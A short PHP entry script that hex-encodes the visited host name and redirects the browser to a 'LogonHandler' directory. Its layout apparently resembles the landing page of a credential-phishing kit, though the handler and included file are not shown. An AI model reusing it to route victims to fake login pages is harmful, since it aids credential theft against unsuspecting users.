<?php
/*
* index.php
*/
require_once 'LogonHandler/hostname.php';



$host = bin2hex ($_SERVER['HTTP_HOST']);
$Logon="LogonHandler/?$host";

header("location: $Logon");


?>
